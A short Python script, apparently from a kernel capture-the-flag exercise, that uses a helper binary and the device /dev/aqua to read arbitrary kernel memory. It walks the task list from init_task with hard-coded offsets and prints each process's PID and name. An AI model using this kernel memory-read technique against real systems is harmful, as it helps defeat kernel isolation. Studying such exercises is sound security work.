#!/usr/bin/python3

import os
import subprocess
import struct
import pwn

PID_OFFSET = 992
NEXT_OFFSET = 824
COMM_OFFSET = 1272

result = subprocess.Popen(
    '/tmp/files init', shell=True, stdout=subprocess.PIPE)
init_task_addr = int(result.stdout.read(), 16)


def get_comm(base: int):
    result = subprocess.Popen(
        f'/tmp/files /dev/aqua r {base+COMM_OFFSET} 16', shell=True, stdout=subprocess.PIPE)
    return str(result.stdout.read(), 'ascii', 'ignore').strip('\x00')


def get_next(base: int):
    result = subprocess.Popen(
        f'/tmp/files /dev/aqua r {base+NEXT_OFFSET} 4', shell=True, stdout=subprocess.PIPE)
    return struct.unpack('L', result.stdout.read())[0]-NEXT_OFFSET


def get_pid(base: int):
    result = subprocess.Popen(
        f'/tmp/files /dev/aqua r {base+PID_OFFSET} 4', shell=True, stdout=subprocess.PIPE)
    return struct.unpack('l', result.stdout.read())[0]


def main():
    print(get_pid(init_task_addr), get_comm(init_task_addr))
    cur = get_next(init_task_addr)
    while cur != init_task_addr:
        print(get_pid(cur), get_comm(cur))
        cur = get_next(cur)


if __name__ == '__main__':
    main()
